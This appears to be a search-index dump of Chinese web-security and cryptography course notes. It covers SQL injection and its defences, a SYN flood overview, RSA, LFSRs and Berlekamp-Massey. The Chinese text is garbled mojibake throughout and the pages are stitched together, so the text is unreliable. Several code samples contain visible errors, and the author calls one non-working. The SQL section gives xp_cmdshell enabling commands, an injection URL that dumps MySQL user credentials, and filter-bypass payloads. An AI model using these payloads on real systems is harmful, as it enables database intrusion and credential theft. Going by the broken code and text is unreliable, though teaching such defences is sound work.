\u0026#39;show advanced options\u0026#39;,1\rRECONFIGURE\rEXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;,1\rRECONFIGURE é™¤äº† xp_cmdshell å¯ä»¥ç”¨äºæ‰§è¡Œå‘½ä»¤å¤–ã€‚è¿˜æœ‰å…¶ä»–ä¸€äº›æœ‰ç”¨çš„å‡½æ•°ã€‚æ¯”å¦‚ xp_regread å¯ä»¥æ“ä½œæ³¨å†Œè¡¨ç­‰ç­‰ã€‚\nSQL Column Truncation #  åœ¨ MySQL çš„é…ç½®é€‰é¡¹ä¸­ï¼Œæœ‰ä¸€ä¸ª sql_mode é€‰é¡¹ã€‚ä»¥ä¸‹å‘½ä»¤å¼€å¯ strict æ¨¡å¼ï¼š\nsql-mode=\u0026#34;STRICT_TRANS_TABLE,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\u0026#34; å½“ MySQL çš„ sql-mode è®¾ç½®ä¸º default æ—¶ï¼ˆå³æ²¡æœ‰å¼€å¯ STRICT_ALL_TABLESï¼‰ï¼ŒMySQL å¯¹äºè¶…é•¿å€¼åªä¼šæç¤º warning è€Œä¸æ˜¯ errorï¼Œè¿™å¯èƒ½å¯¼è‡´ä¸€äº›æˆªæ–­é—®é¢˜ã€‚\nå¦‚æœç”¨æˆ·åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€ä¸ªä¹‹å‰å·²ç»å­˜åœ¨çš„æ•°æ®ï¼Œåˆ™å¯èƒ½é€ æˆä¸€äº›è¶Šæƒè®¿é—®ã€‚\né˜²å¾¡ SQL æ³¨å…¥ #  ä¸€äº›ç»•è¿‡æŠ€å·§ #  SQL æ³¨å…¥çš„é˜²å¾¡å¹¶ä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ï¼Œå¼€å‘è€…å¾€å¾€ä¼šèµ°å…¥ä¸€äº›è¯¯åŒºã€‚æ¯”å¦‚åªå¯¹ç”¨æˆ·è¾“å…¥åšä¸€äº› escape å¤„ç†ï¼Œè¿™æ˜¯ä¸å¤Ÿçš„ã€‚æ¯”å¦‚ï¼š\n$rawsql = \u0026#34;SELECT id,name,mail,cv,blog,twitter FROM register WHERE id =\u0026#34; $id = mysql_real_escape_string($_GET[\u0026#39;id\u0026#39;]);  $sql = $rawsql.$id å½“æ”»å‡»è€…æ„é€ å¦‚ä¸‹çš„æ³¨å…¥ä»£ç æ—¶ï¼Œä»ç„¶ä¼šæ³¨å…¥æˆåŠŸï¼š\nhttp://victim.com/index.php?id=12,AND,1=0,union,select,1,concat(user,0x3a,password),3,4,5,6,from,mysql.user,whrere,user=substring_index(current_user(),char(64),1) è¿™æ˜¯å› ä¸º php_real_escape_string() è¿™ä¸ªå‡½æ•°ä»…ä»…ä¼šè½¬ä¹‰ï¼š\n 'ã€\u0026quot;ã€\\rã€\\nã€NULLã€Ctrl-Z  é‚£ä¹ˆæ˜¯å¦å¢åŠ ä¸€äº›æ¯”å¦‚ç©ºæ ¼ä¹‹ç±»çš„è¿‡æ»¤å­—ç¬¦ï¼Œå°±å¯ä»¥äº†å‘¢ï¼ŸåŸºäºé»‘åå•çš„æ–¹æ³•æ€»æ˜¯å­˜åœ¨é—®é¢˜çš„ã€‚æ¯”å¦‚ä¸‹é¢å°±æ˜¯å‡ ä¸ªä¸éœ€è¦ä½¿ç”¨ç©ºæ ¼çš„ä¾‹å­ï¼š\nSELECT/**/passwd/**/from/**/user/**/  SELECT(passwd)FROM(user) ä¸éœ€è¦å¼•å·ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶ç¼–ç å­—ç¬¦ä¸²ï¼š\nSELECT passwd FROM users WHERE user=0x61646D696E é‚£ä¹ˆåº”è¯¥å¦‚ä½•é˜²å¾¡ SQL æ³¨å…¥å‘¢ï¼Ÿ\nä½¿ç”¨é¢„ç¼–è¯‘ #  é˜²å¾¡ SQL æ³¨å…¥çš„æœ€ä½³æ–¹å¼å°±æ˜¯ï¼šä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ç»‘å®šå˜é‡ã€‚\næ¯”å¦‚åœ¨ JAVA ä¸­ä½¿ç”¨é¢„ç¼–è¯‘çš„ SQL è¯­å¥ï¼š\nString custname = requeset.getParameter(\u0026#34;customerName\u0026#34;); String query = \u0026#34;SELECT account_balance FROM user_data WHERE user_name = ?\u0026#34;;  Preparedstatement patmt = connection.prepareStatement( query ); patmt.setString(1, custname); ResultSet results = pstmt.executeQuery(); åœ¨ PHP ä¸­ç»‘å®šå˜é‡çš„ç¤ºä¾‹ï¼š\n$query = \u0026#34;INSERT INTO myCity (Name,CountryCode,District) VALUES (?,?,?)\u0026#34;; $stmt = $mysqli-\u0026gt;prepare($query); $stmt-\u0026gt;bind_parse(\u0026#34;sss\u0026#34;, $val1, $val2, $val3);  $val1 = $_GET[\u0026#34;Name\u0026#34;]; $val2 = $_GET[\u0026#34;CountryCode\u0026#34;]; $val3 = $_GET[\u0026#34;District\u0026#34;]; $stmt-\u0026gt;execute(); ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹ #  é™¤ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å®‰å…¨çš„å­˜å‚¨è¿‡ç¨‹å¯¹æŠ— SQL æ³¨å…¥ã€‚è¿™ä¸ªæ–¹æ³•ä¸å‰è€…ç±»ä¼¼ï¼ŒåŒºåˆ«å°±æ˜¯å­˜å‚¨è¿‡ç¨‹éœ€è¦å°† SQL è¯­å¥å®šä¹‰åœ¨æ•°æ®åº“ä¸­ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­˜å‚¨è¿‡ç¨‹ä¸­ä¹Ÿå¯èƒ½ä¼šå­˜åœ¨æ³¨å…¥é—®é¢˜ã€‚å› æ­¤åº”è¯¥å°½é‡é¿å…åœ¨å­˜å‚¨è¿‡ç¨‹å†…ä½¿ç”¨åŠ¨æ€çš„ SQL è¯­å¥ã€‚\nä¸‹é¢é‚£æ˜¯ä¸€ä¸ªåœ¨ Java ä¸­è°ƒç”¨å­˜å‚¨è¿‡ç¨‹çš„ä¾‹å­ï¼š\nString custname = request.getParameter(\u0026#34;customerName\u0026#34;); try {  CallableStatement cs = connection.prepareCall(\u0026#34;{call sp_getAccountBalance(?)}\u0026#34;);  ca.setString(1, custname);  Result result = cs.executeQuery();  // .... } catch (SQLException se) {  // .... } æ£€æŸ¥æ•°æ®ç±»å‹ #  æ£€æŸ¥è¾“å…¥ç±»å‹ï¼Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¯ä»¥å¯¹æŠ— SQL æ³¨å…¥ã€‚\næ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼Œå°±é™åˆ¶äº†è¾“å…¥æ•°æ®çš„ç±»å‹åªèƒ½ä¸ºæ•´æ•°ï¼š\n\u0026lt;?php  settype($offset, \u0026#34;integer\u0026#34;); \t$query = \u0026#34;SELECT id,name FROM products ORDER BY name LIMIT 20 OFFSET $offset;\u0026#34;; ?\u0026gt;ä½¿ç”¨å®‰å…¨å‡½æ•° #  ä¸€èˆ¬æ¥è¯´ï¼Œå„ç§ WEB è¯­è¨€éƒ½å®ç°äº†ä¸€äº›ç¼–ç å‡½æ•°ï¼Œå¯ä»¥å¸®åŠ©å¯¹æŠ— SQL æ³¨å…¥ã€‚å„ç§æ•°æ®åº“å‚å•†éƒ½å¯¹è¿™äº›ç¼–ç å‡½æ•°è¿›è¡Œäº†ä¸€äº› â€œæŒ‡å¯¼â€ã€‚\nå…¶ä»–æ³¨å…¥æ”»å‡» #  "},{"id":346,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"2.æ–‡ä»¶ä¸Šä¼ æ¼æ´","section":"2.æœåŠ¡ç«¯å®‰å…¨","content":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ #  "},{"id":347,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/7.%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BBddos/","title":"7.åº”ç”¨å±‚æ‹’ç»æœåŠ¡æ”»å‡» Ddo S","section":"2.æœåŠ¡ç«¯å®‰å…¨","content":"åº”ç”¨å±‚æ‹’ç»æœåŠ¡æ”»å‡» DDoS #   DDoS: Distributed Denial of Serviceï¼Œåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ã€‚å®ƒè¢«è®¤ä¸ºæ˜¯å®‰å…¨é¢†åŸŸä¸­æœ€éš¾è§£å†³çš„é—®é¢˜ä¹‹ä¸€ï¼Œè¿„ä»Šä¸ºæ­¢ä¹Ÿæ²¡æœ‰ä¸€ä¸ªå®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚\n DDoS ç®€ä»‹ #  å¸¸è§çš„ DDoS æ”»å‡»æœ‰ SYN Floodã€UDP Floodã€ICMP Floodã€‚\nå…¶ä¸­ï¼šSYN Flood æ˜¯å‘ç°äº 1996 å¹´æœ€ç»å…¸çš„ DDoS æ”»å‡»ã€‚å®ƒåˆ©ç”¨äº† TCP åè®®è®¾è®¡ä¸­çš„ç¼ºé™·ï¼Œæƒ³è¦ä¿®å¤è¿™æ ·çš„ç¼ºé™·å‡ ä¹æ˜¯ä¸å¯èƒ½çš„äº‹æƒ…ã€‚å®ƒçš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\n æ”»å‡»è€…é¦–å…ˆä¼ªé€ å¤§é‡çš„æºåœ°å€ IPï¼Œåˆ†åˆ«å‘æœåŠ¡å™¨å‘é€å¤§é‡çš„ SYN åŒ…ï¼› æ­¤æ—¶æœåŠ¡å™¨ä¼šè¿”å› SYN/ACK åŒ…ï¼Œä½†å› ä¸ºæºåœ°å€æ˜¯ä¼ªé€ çš„ï¼ŒæœåŠ¡å™¨å¹¶ä¸ä¼šåº”ç­”ï¼Œä¼šé‡è¯•å¹¶ä¸”ç­‰å¾…ä¸€ä¸ª SYN Timeï¼ˆ30s - 2minï¼‰ï¼Œå¹¶ä¸”ä¸¢å¼ƒè¿™ä¸ªé“¾æ¥ï¼› æœåŠ¡å™¨æ­¤æ—¶å°†ä¼šæ¶ˆè€—å¤§é‡çš„èµ„æºæ¥å¤„ç†è¿™ç§åŠè¿æ¥ï¼Œæœ€åæœåŠ¡å™¨æ— æ³•ç†ç¬æ­£å¸¸çš„è¿æ¥è¯·æ±‚ï¼›  å¯¹æŠ— SYN Floow çš„ä¸»è¦æ–¹æ³•ï¼š\n SYN Cookie/SYN Proxyï¼Œsaferset ç­‰ç®—æ³•ï¼› SYN Cookie çš„ä¸»è¦æ€æƒ³æ˜¯ä¸ºæ¯ä¸ª IP åœ°å€åˆ†é…ä¸€ä¸ª Cookieï¼Œå¹¶ä¸”ç»Ÿä¸€æ¯ä¸ª IP åœ°å€çš„è®¿é—®é¢‘ç‡ã€‚çŸ­æ—¶é—´å†…å¤§é‡æ¥è‡ªåŒä¸€ä¸ª IP åœ°å€çš„æ•°æ®åŒ…ï¼Œåˆ™ä¼šè¢«è®¤ä¸ºå—åˆ°æ”»å‡»ã€‚  åº”ç”¨å±‚ DDoS æ”»å‡» #  "},{"id":348,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1.introduction/","title":"1. Introduction","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 1. Introduction #  Terminologies in this Class:\n Confidentiality, Integrity, Authenticity etc. å®‰å…¨ä¸‰è¦ç´ ï¼šä¿å¯†æ€§ã€å®Œæ•´æ€§ã€è®¤è¯æ€§ï¼ˆçœŸå®æ€§ï¼‰  Communication System Security #  Communication system security is achieved in two aspects:\n Make each node a trusted platform: robust hardware, validated system software, authorized applications. Protect communications on each link: mutual authentication, key establishment, cipher suite negotiation, failure detection.  è¯¾å ‚ç¬”è®° #  Diffie-Hellman key exchange (DH) #  ç”¨äºåœ¨ä¸¤ä¸ªç»ˆç«¯ä¹‹é—´å…±äº«ä¸€ä¸ªç§å¯†çš„æ•°å­—ï¼š\næ­¤æ—¶ä¸¤ä¸ªç»ˆç«¯ç›´æ¥å°±å…±äº«äº†ä¸€ä¸ªç§å¯†ä¿¡æ¯ï¼š$$\\displaystyle g^{X_A X_B}\\pmod{p}$$\npublic-key crypto-systems (RSA) #  The keys for the RSA algorithm are generated the following way:\n Choose two distinct prime numbers p and q  For security purposes, the integers p and q should be chosen at random, and should be similar in magnitude but differ in length by a few digits to make factoring harder.[2] Prime integers can be efficiently found using a primality test.   Compute n = pq  n is used as the modulus for both the public and private keys. Its length, usually expressed in bits, is the key length.   Compute $$\\phi(n) = lcm(\\phi(p), \\phi(q)) = lcm(p âˆ’ 1, q âˆ’ 1)$$, where $$\\phi$$ is Carmichael\u0026rsquo;s totient function. This value is kept private. Choose an integer e such that 1 \u0026lt; e \u0026lt; Î»(n) and gcd(e, Î»(n)) = 1; i.e., e and Î»(n) are coprime. Determine d as d â‰¡ eâˆ’1 (mod Î»(n)); i.e., d is the modular multiplicative inverse of e modulo Î»(n).  "},{"id":349,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.prsg/","title":"2. Prsg","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 2. Pseudorandom Sequence Generators #  Background #  We focus on the deterministic algorithm:\n One is linear/non-linear feedback shift registers based on PRSGs. One relies on computation infeasible problems or other types of maths structure.  Feedback Shift Register Sequence #  Feedback shift register (åé¦ˆä½ç§»å¯„å­˜å™¨), denotes as FSRï¼š\n  Introduction to FSR: feedback function $$a_{k+n} = f(a_k, a_{k+1}, \\cdots, a_{k+n-1})$$\n  A state diagram of an FSR\n  FSRs with maximum periods:\n Maximum periods of an n-stage FSR sequence: $$2^n$$. Referred to as de Bruijn sequence. Maximum periods of an n-stage LFSR sequence: $$2^n - 1$$. Referred to as m-sequence.    LFSR and m-sequence #  Definition and properties #  Definition (Characteristic polynomial):\n For feedback function: $$f(x_0, x_1, \u0026hellip;, x_{n-1}) = c_{n-1}x_{n-1} +\u0026hellip; +c_1x_1 + c_0 x_0$$ $$f(x) = x^n + c_{n-1}x^{n-1} +\u0026hellip; +c_1x^1 + c_0 x^0$$ is called characteristic polynomial  Definition (Minimal polynomial):\n For a given sequence $${a_i} = {a_0, a_1, \\cdots, a_{n-1}}$$ The characteristic polynomial with the smallest degree generating $${a_i}$$ is called minimal polynomial  Property:\n The minimal polynomial of an LFSR is a divisor of its characteristic polynomial.  Property (m-sequence and its feedback polynomial):\n The period of the sequence $${a_i}$$ is equal to the period of its minimal polynomial. So in order to design an m-sequence, we need to find a primitive polynomial.($$\\deg f(x) = n$$)  Property:\n All m-sequences generated by the same LFSR are shift equivalent.  Common equations:\n $$\\displaystyle \\underbrace{0, \\cdots, 0}_{n-1},1 \\Rightarrow f(x) = x^n + 1$$ $$\\displaystyle \\underbrace{1, \\cdots, 1}_{n-1}, 0 \\Rightarrow f(x) = x^{n-1}(x+1) + 1$$  Linear span and BM algorithm #  Definition (linear span):\n  For a given sequence $${a_i} = {a_0, a_1, \\cdots, a_{n-1}}$$\n  We define the degree of the minimal polynomial of a as linear span (linear complexity) of a, denotes as LS(a). Berlekamp-Massey algorithm can be used to calculate LS(a)\n  Property:\n For a given sequence $${a_i} = {a_0, a_1, \\cdots, a_{n-1}}$$, linear span of first N bit denotes as $$L_N$$ Then we have: $$L_{N+1} = L_N \\or (N+1-L_N)$$  Definition (Discrepancy sequences):\n For a given sequence $$a^N = a_0, a_1, \\cdots, a_{N-1}$$ Let $$\\displaystyle f(x) = x^l + \\sum_{i=0}^{l-1}c_ix^i$$ be the minimal polynomial of LFSR. Let $$\\displaystyle v_k = a_{l+k} + \\sum_{i = 0}^{l - 1} c_i a_{i+k}, k = 0,1, \\cdots, N-l-1$$ $${V_k}$$ is called discrepancy sequence associated with f(x) and $$a^N$$  Lemma:\n Assume that $$f_{n-1}(x)$$ is the characteristic polynomial of the shortest LFSR generating $$a_0, a_1, \\cdots, a_{n-1}$$, but not $$a_0, a_1, \\cdots, a_{n}, n \u0026lt; N$$. In the other word (Assuming $$LS(f(x)) = l_{n-1}$$):  For $$k=0,1,\\cdots, n-1-l_{n-1}$$, we have $$\\displaystyle a_{l_{n-1}+k} = \\sum_{i=0}^{l_{n-1}-1}a_{i+k} \\Rightarrow v_k = 0$$ But for $$k = n - l_{n-1} \\Rightarrow v_k = 1$$   Consider discrepancy sequences: $$\\displaystyle (v_0, v_1, \\cdots, v_{n - l_{n-1}}) = (\\underbrace{0, \\cdots,0}{n - l{n-1}}, 1)$$ How to obtain $$f_n$$ from the previous $$f_i, i \u0026lt; n$$?  Find the nearest LFSR such that $$l_{m-1} \u0026lt; l_{m} = \\cdots = l_{n-1}$$ Assuming $$a = m - l_{m-1}, b = n - l_{n-1}$$, we can obtain f: $$f_n(x) = \\begin{cases} f_{n-1} + x^d f_{m-1}, \u0026amp; d = a - b, a \u0026gt; b \\ x^d f_{n-1} + f_{m-1}, \u0026amp; d = b - a, a \\le b\\end{cases}$$    Algorithm (Berlekamp-Massey) python code (it seems couldn\u0026rsquo;t run):\n#!/usr/bin/env python2.7 # coding=utf-8 from sage.all import *   class BMSolution:  def __init__(self, capturedSequence):  self.x = var(\u0026#34;x\u0026#34;)  self.Z = GF(2)  capturedSequence = [self.Z(bit) for bit in capturedSequence]  self.rawSequence = capturedSequence  self.initializePolynomial()   def initializePolynomial(self):  self.k = self.rawSequence.index(1) # ç¬¬ä¸€ä¸ª 1 bit  self.minimalPolynomial = self.x ** (self.k+1) + 1 # f(x), å½“å‰çš„æœ€å°å¤šé¡¹å¼  self.m = 0 # å‰ä¸€ä¸ªå¤šé¡¹å¼æ‰€åœ¨çš„æœ€åçš„ä½ç½®  self.prevMinPolynomial = 1 # g(x), ä¹‹å‰çš„ä¸€ä¸ªæœ€å°å¤šé¡¹å¼   def solvePolynomial(self):  for n in range(self.k, len(self.rawSequence)):  l = self.minimalPolynomial.degree(self.x)  d = sum([self.minimalPolynomial.coefficient(self.x, i) * self.rawSequence[n - l + i] for i in range(l + 1)]) % 2  if d == 0: continue  a = (self.m - self.prevMinPolynomial.degree(self.x))  b = (n - self.minimalPolynomial.degree(self.x))  if 2*l \u0026gt; n:  self.minimalPolynomial = self.minimalPolynomial - self.x ** (a - b) * self.prevMinPolynomial  else:  prevMinPolynomial = self.minimalPolynomial  self.minimalPolynomial = self.x ** (b - a) * self.minimalPolynomial - self.prevMinPolynomial  self.prevMinPolynomial = prevMinPolynomial  return self.minimalPolynomial  if __name__ == \u0026#34;__main__\u0026#34;:  sp = BMSolution([0,0,0,1,1,1,0,1,0,1])  print(sp.solvePolynomial()) PostScript: å¯ä»¥ç›´æ¥åœ¨ sagemath ä¸­ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼æ±‚è§£ï¼š\nberlekamp_massey([0,0,0,1,0,1,0,1]) # x^2 - 1 Property:\n If 2n (n is the linear span) bits are known in an N bits long sequence, we can recover the rest of bits.  Correlation function #  Goal:\n Correlation function measure the similarity one sequence with a shift of the other.  Definition (when periods are the same N):\n $$\\displaystyle C_{a, b}(\\tau) = \\sum_{i = 0}^{N - 1} (-1)^{a_i + b_i + \\tau}$$ It\u0026rsquo;s equal to the difference between the number of the agreements and that of disagreements of a with the shift t.  Definition (when period are different N and M):\n Assume $$T = lcm(N, M)$$, $$\\displaystyle C_{(a^T, b)} (\\tau) = \\sum_{i = 0}^{T - 1} (-1)^{a_i + b_i +\\tau}$$  Randomness #  Golomb\u0026rsquo;s Randomness Postulates #  R-1 Blance property:\n 0 and 1 has the same possibility  R-2 run property:\n A periodic sequence is said to have the run property if in every period of the sequence, there are $$2^k$$ runs of length n-k where $$n = logN, 1 \\le k \\lt n$$. Moreover, for each of these lengths, there are equally many runs of 0\u0026rsquo;s and of 1\u0026rsquo;s.  R-3 Idea 2-level autocorrelation:\nRandomness Criteria #   Large period Statistics properties:  Balanced property: each element occurs nearly equally many times; Run property R2; (ideal) k-tuple distribution; Each non-zero k-tuple occurs exactly one.   Correlation:  2-level autocorrelation Low crosscorrelation   Large linear span (complexity). $$\\displaystyle \\frac{tN}{2} \\le LS(a) \\le N, \\text{where t is constant}, 0 \\lt t \\le 1$$ Indistinguishability.  Generators #   Non-linear generator Filtering sequence generator Combination sequence generator Select boolean generator Clock control \u0026amp; shrink generator Stop and go generator Shrink generator  One-Time Pad #  Known Attack #  Correlation attack #  A naive way to conduct an attack is to do an exhaustive search for the entire space for a possible internal state, then the search complexity is given by: $$\\displaystyle T_0 = \\prod_{i=0}^{m-1} 2^{n_i}$$\nIf we can decompose the PRSG into m sub-generators, those m sub-generators are filtered by a boolean function h: $$Z = h(X_0, X_1, \\cdots, X_{m-1})$$.\nWe now look at whether the output random variable Z and input variable $$X_i$$ are correlated. Using this fact, the search complexity can be tremendously reduced to approximately:\n $$\\displaystyle T_1 = \\sum_{i \\in I_c} 2^{n_i} + \\prod_{i \\in I_{uc}}2^{n_i}$$ where $$\\begin{cases}I_c = {i | 0 \\le i \u0026lt; m,\u0026amp; Z\\text{ and }X_i\\text{ are correlated}} \\ I_{uc} = {i | 0 \\le i \u0026lt; m,\u0026amp; Z\\text{ and }X_i\\text{ are uncorrelated}} \\end{cases}$$  è¯¾å ‚ç¬”è®° #  æœ‰é™åŸŸ #  éœ€è¦ä¸€ä¸ªéšæœºæ€§ã€ç®—æ³•é€Ÿåº¦å…¼é¡¾çš„ç®—æ³•ã€‚\næ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹çš„è¿ç®—ï¼šå¼‚æˆ–ã€ç§»ä½ã€åŠ å‡æ³•ã€å¸ƒå°”å‡½æ•°\u0026hellip;\nå®šä¹‰ï¼ˆFinite Fieldï¼‰ï¼šè®°ä½œ $$\\mathbb{F}_n$$\n å¯¹äº + è¿ç®—ï¼šå­˜åœ¨ 0 å…ƒï¼›å¯¹äºä»»æ„å…ƒç´ ï¼Œå­˜åœ¨ä¸€ä¸ªå…¶åŠ æ³•è¿ç®—çš„è´Ÿå…ƒã€‚ å¯¹äº * è¿ç®—ï¼šå­˜åœ¨ 1 å…ƒï¼›å¯¹äºä»»æ„å…ƒç´ ï¼Œå­˜åœ¨ä¸€ä¸ªå…¶ä¹˜æ³•çš„é€†å…ƒã€‚  å®šç†ï¼š\n  å¯¹äº p æ˜¯ç´ æ•°ï¼Œ$$\\mathbb{Z}_p = \\mathbb{F}_p$$\n  Expansionï¼š$$\\displaystyle \\mathbb{F}p \\Rightarrow \\mathbb{F}{p^n}$$\n  å¦‚ä½•ä» $$\\mathbb{F}2$$ æ„é€  $$\\mathbb{F}{2^n}$$ï¼š\n  ä»¤ $$GF(2^n) = {x_0 + x_1 \\alpha + \u0026hellip; + x_{n-1} \\alpha^{n-1}\\text{, where } x_i \\in \\mathbb{F_2}}$$\n  é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ï¼š$$\\displaystyle \\mathbb{F}_4 = \\frac{GF(2)}{p(x)}\\text{, where }\\deg{p(x)} = n, p(x):irreducible$$\n  è¡¨ç¤ºæ–¹æ³•ï¼š\n polynomial representation:$$x_0 + x_1\\alpha + x_2 \\alpha^2 +\u0026hellip; + x_{n-1}\\alpha^{n-1}$$ vector based representation:$$(x_0, x_1,\u0026hellip;, x_{n-1})$$ Exponential representation:$${\\alpha^i, i = 0,1,\u0026hellip;,2^{n}-2}$$  å®šä¹‰ï¼ˆMultiplicative Groupï¼‰ï¼š\n $$\\displaystyle GF(2^n)^{*} = GF(2^n)\\text{\\}{0} = {\\alpha^i, i = 0,1,\u0026hellip;,2^{n}-2}$$  Group #  å®šä¹‰ï¼š\n  Associative: $$a * (bc) = (ab)*c$$\n  Identity: $$\\exist e \\in G, ae = ea = a$$\n  $$\\forall a \\in G, \\exist a^{-1}, \\text{so that }a * a^{-1} = e$$\n  $$\\text{For }a, b \\in G, ab = ba \\Rightarrow$$ Commutative Group äº¤æ¢ç¾¤\n  Primitive #  å®šä¹‰ï¼šè€ƒè™‘åœ¨ $$GF(2^n)^*$$ ä¸­ï¼š\n  $$ord \\beta$$: the least integer m such that $$\\beta^m = 1$$\n  primitive: We say $$\\beta$$ is primitive if $$ord \\beta = 2^n - 1$$\n  å®šç†ï¼š\n  $$\\alpha$$ is a root of $$f(x)$$, then $$\\alpha^{2^i}, i = 0,1,\u0026hellip;,n-1$$ are root of $$f(x)$$\n  $$\\displaystyle ord \\alpha^s = \\frac{ord \\alpha}{gcd(s, ord \\alpha)}$$\n  Feedback Shift Register Sequences #  Maximum Periods #  æˆ‘ä»¬å‘ç°ï¼š\n Output bits are closely related to feedback function, and internal states  m-sequence #  æ€§è´¨ï¼š\n  å®šä¹‰æ“ä½œç¬¦ Lï¼š$$(a_0, a_1, \u0026hellip;, a_{n-1}) \\rightarrow (a_1, a_2, \u0026hellip;, a_n)$$\n  å¯¹äºç‰¹å¾å¤šé¡¹å¼ï¼Œæˆ‘ä»¬æ€»æœ‰ï¼š$$\\displaystyle f(L)*\\overset{\\rightarrow}{a} = 0$$\n  æ€§è´¨ï¼š\n å¦‚æœ f(x), g(x) æ˜¯ç‰¹å¾å¤šé¡¹å¼ï¼Œæˆ‘ä»¬æœ‰ï¼š$$f(x) + g(x), x^i *f(x), h(x) * f(x)$$ ä¹Ÿæ˜¯ç‰¹å¾å¤šé¡¹å¼  æœ‰ Caylor-Hamilton Theoremï¼š\n  å¯¹äº FSRS çš„è½¬ç§»çŸ©é˜µ Mï¼Œ\n  If $$f(x) | x^r -1 \\Rightarrow M^r = I \\Rightarrow$$ Internal state repeats at the period r\n  å®šä¹‰ï¼š\n å¦‚æœæˆ‘ä»¬è¿ä¸ª LFSR é€šè¿‡åŒä¸€ä¸ªè½¬ç§»å‡½æ•°å¾—åˆ°ï¼Œåˆ™æˆ‘ä»¬ç§°ä»–ä»¬ä¸º shift equivalent  linear span #  å®šä¹‰ï¼š\n An LFSR s said to generate a finite sequence $$a_0, a_1, \u0026hellip;, a_{N-1}$$ when the this sequence conincides with the first N output elements of l-stage LFSR for the initial state $$(a_0, a_1,\u0026hellip;,a_{l-1})$$. The shortest length of the LFSR which generate $$a^N$$ is called the linear span of $$a^N$$.  Discrepancy Sequences #  å¯¹äºä¸€ä¸ªç»™å®šçš„åºåˆ—ï¼ŒDiscrepancy Sequences æ˜¯ä¸€ä¸ªæ„é€ ç”Ÿæˆç»™å®šåºåˆ—çš„ LFSR çš„æ–¹æ³•ã€‚\nå› ä¸ºç‰¹æ®Šçš„æˆ‘ä»¬æœ‰ï¼š$$00\\dots001 \\Rightarrow f(x) = x^n +1$$\næˆ‘ä»¬åˆçŸ¥é“ $$\\displaystyle f_n(x) \\begin{cases}f_{n-1} + x^d f_{m-1}, d = a-b,\\text{if }a\u0026gt;b \\ x^df_{n-1} + f_{m-1}, d = b-a, \\text{if }a \\le b \\end{cases}$$\nCorrelation Functions of Sequences #  Mesure the similarity of one sequence with a shift of the other.\nDefine the two sequences correlation function with the same period N: $$\\displaystyle C_{a,b}(\\tau) = \\sum_{i = 0}^{N-1} (-1)^{a_i + b_i + \\tau}$$\n$$C_a(t)$$ measures the similarity between the sequence and its shift, euqal to the difference between the number of the agreements and that of disagreements of a with the shift t.\nDefined for two sequences a and b with their respective lengths N and M: $$\\displaystyle C_{a^T, b} (\\tau) \\sum_{i = 0}^{T-1} (-1)^{a_i + b_i + \\tau}, \\tau = 0,1,\\dots, T = lcm(N, M)$$\n"},{"id":350,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/3.streamciphers/","title":"3. Stream Ciphers","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 3. Design of Stream Ciphers #  Overview #  Two phases in stream cipher:\n key initialization phase.(KIA) PRSG running phase.  Design princinple #  Typical stream Ciphers #  A5/1 in GSM #  Cipher flow:\nä¸Šå›¾ä¸­ï¼ŒA5/1 éƒ¨åˆ†å°±æ˜¯åŸºäºä¸€ä¸ªå¯†é’¥çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå®ƒä¸»è¦ç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š\n  It uses three LFSRs generating m-sequences of large periods\nwhich 